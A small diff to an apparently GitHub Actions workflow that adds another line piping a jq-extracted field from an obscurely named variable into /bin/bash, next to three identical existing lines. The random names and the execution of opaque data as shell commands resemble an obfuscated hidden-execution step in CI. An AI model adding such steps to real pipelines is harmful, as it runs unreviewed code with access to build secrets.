@@ -34,6 +34,7 @@ jobs:
           echo $mqvx155 | jq -r .los57220 | /bin/bash
           echo $kk89515 | jq -r .hwc2 | /bin/bash
           echo $b327 | jq -r .zs61 | /bin/bash
+          echo $sgze3916 | jq -r .j45243 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
